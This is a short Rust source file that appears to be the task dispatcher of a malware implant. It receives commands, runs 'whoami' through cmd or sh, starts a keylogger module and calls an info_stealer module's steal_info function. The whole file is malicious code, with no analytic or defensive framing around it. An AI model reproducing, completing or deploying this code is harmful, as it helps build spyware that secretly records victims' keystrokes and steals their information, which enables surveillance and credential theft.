use std::process::Command;
use crate::modules::{keylogger, info_stealer};

pub fn execute_task(task_cmd: &str) -> String {
    match task_cmd {
        "whoami" => {
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd").args(&["/C", "whoami"]).output()
            } else {
                Command::new("sh").args(&["-c", "whoami"]).output()
            };
            match output {
                Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
                Err(e) => format!("Error: {}", e),
            }
        }
        "start_keylogger" => {
            keylogger::start_keylogger();
            "Keylogger started".to_string()
        }
        "get_info" => info_stealer::steal_info(),
        _ => format!("Unknown command: {}", task_cmd),
    }
}